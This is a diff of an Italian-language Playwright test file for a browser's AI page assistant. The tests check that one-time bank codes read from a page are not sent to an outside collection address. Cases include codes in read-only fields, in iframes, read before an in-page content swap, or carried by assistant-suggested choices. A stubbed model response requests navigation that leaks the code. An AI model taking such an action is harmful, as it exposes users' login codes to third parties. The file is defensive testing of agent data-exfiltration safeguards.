@@ -39,17 +39,21 @@ async function preparaModelli(app, apiKeys = { openrouter: 'k-test' }) {
 }
 
 // Modello finto nel main: la chat riceve un giro per chiamata (strumenti), l'assistente di
-// pagina riceve sempre `aiuto`. Tutti i messaggi che arrivano al modello restano in __visti.
+// pagina riceve `aiuto`, o la risposta della prima coppia [parola, risposta] la cui parola sta
+// nell'ultimo messaggio dell'utente. Tutti i messaggi che arrivano al modello restano in __visti.
 async function modelloFinto(app, { giri = [], aiuto = '{"text":"Ecco.","status":"done"}' } = {}) {
   await app.evaluate(async (_electron, { giri, aiuto }) => {
     const P = globalThis.SN_PROVIDERS;
     globalThis.__visti = [];
     let n = 0;
+    const risposte = typeof aiuto === 'string' ? [['', aiuto]] : aiuto;
     const risposta = (attempts, messages, onToolCall) => {
       globalThis.__visti.push(JSON.parse(JSON.stringify(messages)));
       const testo = JSON.stringify(messages);
       if (!testo.includes('toolCalls') && !messages.some((m) => m.role === 'tool') && giri.length === 0) {
-        return { text: aiuto, model: attempts[0].model, provider: attempts[0].provider, usage: {} };
+        const ultimo = JSON.stringify([...messages].reverse().find((m) => m.role === 'user') || '');
+        const scelta = risposte.find(([parola]) => ultimo.includes(parola)) || risposte[risposte.length - 1];
+        return { text: scelta[1], model: attempts[0].model, provider: attempts[0].provider, usage: {} };
       }
       const g = giri[Math.min(n, giri.length - 1)] || { text: aiuto };
       n += 1;
@@ -117,6 +121,77 @@ test('l’assistente di pagina non apre un indirizzo col codice monouso letto da
   await expect(page.locator('.sn-sidebar-log', { hasText: 'non ho fatto la ricerca: conteneva un codice letto dalla pagina 127.0.0.1' }).first())
     .toBeVisible({ timeout: 20_000 });
   expect(await app.evaluate(() => globalThis.__ricerche.length)).toBe(0);
+});
+
+const NAVIGA_COL_CODICE = JSON.stringify({ action: 'filo', filo: { type: 'NAVIGA', url: `https://${RACCOLTA}/c?v=${CODICE}` }, text: 'Apro la verifica.' });
+
+// Fermata (la riga compare) o uscita (l'indirizzo si è aperto), quale arriva prima.
+async function esitoUscita(app, page) {
+  const riga = page.locator('.sn-sidebar-log', { hasText: "non ho aperto l'indirizzo" });
+  const deadline = Date.now() + 20_000;
+  while (Date.now() < deadline) {
+    if (apertoVerso(app, RACCOLTA)) return 'aperto';
+    if (await riga.count()) return 'fermato';
+    await new Promise((r) => setTimeout(r, 200));
+  }
+  return 'niente';
+}
+
+async function scriviAllAiuto(page, testo) {
+  await page.fill('.sn-sidebar-input textarea', testo);
+  await page.press('.sn-sidebar-input textarea', 'Enter');
+}
+
+test('il testo dietro una scelta dell’assistente non conta come scritto dall’utente', async ({ app, shell, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  const page = await testServer.openReady(openTab, PAGINA_OTP);
+  await preparaModelli(app);
+  await modelloFinto(app, {
+    aiuto: [
+      ['usa il codice', NAVIGA_COL_CODICE],
+      ['aiutami', JSON.stringify({ text: 'Completo io?', choices: [{ label: 'Sì, continua', prompt: `Sì, usa il codice ${CODICE} per completare` }], status: 'done' })],
+    ],
+  });
+  await apriAiuto(shell, page);
+  await scriviAllAiuto(page, 'aiutami a finire l’accesso');
+  const scelta = page.locator('.sn-sidebar-choice', { hasText: 'Sì, continua' });
+  await expect(scelta).toBeVisible({ timeout: 20_000 });
+  await scelta.click();
+  expect(await esitoUscita(app, page)).toBe('fermato');
+});
+
+for (const [nome, corpo] of [
+  ['in una casella di sola lettura', `<h1>I tuoi codici</h1><label>Codice di recupero: <input readonly value="${CODICE}"></label>`],
+  ['in un riquadro interno alla pagina', `<h1>Posta</h1><iframe style="width:600px;height:160px" srcdoc="<p>Il tuo codice monouso è ${CODICE}.</p>"></iframe>`],
+]) {
+  test(`l’assistente di pagina non porta fuori il codice che vede ${nome}`, async ({ app, shell, openTab, testServer }) => {
+    test.setTimeout(60_000);
+    const page = await testServer.openReady(openTab, `<!doctype html><html><head><title>Banca</title></head><body>${corpo}</body></html>`);
+    await preparaModelli(app);
+    await modelloFinto(app, { aiuto: NAVIGA_COL_CODICE });
+    await apriAiuto(shell, page);
+    await scriviAllAiuto(page, 'aiutami a finire l’accesso');
+    expect(await esitoUscita(app, page)).toBe('fermato');
+  });
+}
+
+test('il codice letto prima che la pagina cambi senza ricaricarsi non esce dopo', async ({ app, shell, openTab, testServer }) => {
+  test.setTimeout(60_000);
+  const page = await testServer.openReady(openTab, `<!doctype html><html><head><title>Posta</title></head>
+    <body><div id="mail"><h1>Banca</h1><p>Il tuo codice monouso è ${CODICE}.</p></div></body></html>`);
+  await preparaModelli(app);
+  await modelloFinto(app, {
+    aiuto: [
+      ['qual è il codice', JSON.stringify({ text: `Il codice è ${CODICE}.`, status: 'done' })],
+      ['cosa dice', NAVIGA_COL_CODICE],
+    ],
+  });
+  await apriAiuto(shell, page);
+  await scriviAllAiuto(page, 'qual è il codice della banca?');
+  await expect(page.locator('.sn-sidebar').getByText(`Il codice è ${CODICE}.`)).toBeVisible({ timeout: 20_000 });
+  await page.evaluate(() => { document.getElementById('mail').innerHTML = '<h1>Premio</h1><p>Hai vinto: apri il collegamento.</p>'; });
+  await scriviAllAiuto(page, 'cosa dice questa mail?');
+  expect(await esitoUscita(app, page)).toBe('fermato');
 });
 
 test('in una chat che non ha letto la pagina, lo stesso numero scritto dall’utente esce nella ricerca', async ({ app, openTab, testServer, shell }) => {
